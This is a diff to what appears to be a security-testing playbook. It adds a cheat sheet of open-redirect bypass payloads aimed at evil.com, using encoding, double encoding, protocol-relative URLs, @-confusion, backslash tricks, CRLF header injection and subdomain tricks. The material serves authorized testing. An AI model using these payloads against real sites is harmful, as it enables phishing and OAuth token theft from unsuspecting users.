@@ -434,3 +434,75 @@ Enumerate every redirect-bearing parameter and inject an external URL (`https://
 ## Verification & Impact
 
 CONFIRMED when the browser navigates to the attacker-controlled domain (verified via `followRedirects` + response `Location`/body), or a victim's OAuth code/token is delivered to the attacker host. SUSPECTED when a redirect param exists but navigation to evil isn't reproduced — record as candidate. Document impact by the chain enabled: OAuth/code/token theft (High), credential phishing via post-login redirect, session fixation, tabnabbing, SSRF chaining, or standalone phishing (Medium/Low). Capture the request, redirect response, and followed destination via `recordEvidence`.
+
+---
+
+## Cheat Sheet — Open Redirect Bypass Payloads
+
+### Basic Payloads
+
+```
+https://evil.com
+//evil.com
+https://evil.com%2f%2f
+https://evil.com\@target.com
+```
+
+### Encoding Bypass
+
+```
+%68%74%74%70%3a%2f%2f%65%76%69%6c%2e%63%6f%6d
+https%3A%2F%2Fevil.com
+//evil%2ecom
+```
+
+### Double Encoding
+
+```
+%2568%2574%2574%2570%253a%252f%252f%2565%2576%2569%256c%252e%2563%256f%256d
+```
+
+### Protocol-Relative
+
+```
+//evil.com
+///evil.com
+////evil.com
+```
+
+### @-Confusion
+
+```
+https://target.com@evil.com
+https://target.com%40evil.com
+https://evil.com#https://target.com
+```
+
+### Backslash
+
+```
+https://evil.com\target.com
+https://evil.com\/target.com
+```
+
+### Newline/Tab Injection
+
+```
+https://evil.com%0d%0aLocation:%20https://evil.com
+https://evil.com%09
+```
+
+### Subdomain Tricks
+
+```
+https://evil.com.target.com
+https://target.com.evil.com
+```
+
+### Wildcard/Path Tricks
+
+```
+https://target.com@evil.com
+https://target.com.evil.com
+https://evil.com?next=target.com
+```
